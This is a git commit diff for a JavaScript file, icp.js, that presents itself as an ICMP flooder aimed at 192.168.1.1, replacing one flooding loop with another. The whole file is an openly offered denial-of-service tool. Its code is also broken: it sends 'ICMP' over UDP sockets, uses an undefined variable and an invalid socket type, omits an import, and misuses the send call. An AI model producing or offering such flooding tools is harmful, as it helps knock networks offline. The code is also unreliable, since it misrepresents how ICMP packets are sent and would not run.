d9bb884a836255d7953728da64568285844cd5bd
YTTA YANG TAHU TAHU AJA <113217515+JohanChungus@users.noreply.github.com>
2023-10-02 14:16:34 +0700

    Update icp.js

--- icp.js
+++ icp.js
@@ -1,26 +1,37 @@
-// ICMP Flooder code in JavaScript
-// This code will flood a target network with ICMP packets
+//ICMP complex flooder code in JavaScript
 
-const dgram = require('dgram');
-const socket = dgram.createSocket('udp4');
-const target = '192.168.1.1';
-
-// Create an array of ICMP packets
-const packets = [];
-for (let i = 0; i < 10; i++) {
-  const packet = Buffer.alloc(64);
-  packet.writeUInt8(0x08, 0);
-  packet.writeUInt8(0x00, 1);
-  packet.writeUInt16BE(0xFFFF, 2);
-  packet.writeUInt32BE(i, 4);
-  packets.push(packet);
+//Create an ICMP header
+function createICMPHeader(type, code){
+    return [type, code, hahaha, 9393939];
 }
 
-// Start sending the packets
-for (let packet of packets) {
-  socket.send(packet, 0, packet.length, 1, target, (err) => {
-    if (err) {
-      console.log('Error sending packet: ' + err);
-    }
-  });
+//Send an ICMP packet to the target IP
+function sendICMPPacket(dstIP, packetHeader){
+    //Create the ICMP packet
+    let packet = Buffer.alloc(packetHeader.length);
+    packetHeader.forEach((h, i) => packet.writeUInt8(h, i));
+
+    //Create the socket
+    let socket = dgram.createSocket('ipv4');
+
+    socket.send(packet, 0, packet.length, dstIP, (err, bytes) => {
+        socket.close();
+    });
 }
+
+//Create an ICMP flooder
+function icmpFlooder(dstIP, type, code){
+    //Create the ICMP header
+    let packetHeader = createICMPHeader(type, code);
+
+    //Send the packet to the target IP
+    sendICMPPacket(dstIP, packetHeader);
+
+    //Repeat the ICMP packet flooding
+    setInterval(() => {
+        sendICMPPacket(dstIP, packetHeader);
+    }, 10000);
+}
+
+//Call the icmpFlooder function
+icmpFlooder('192.168.1.1', 8, 0);
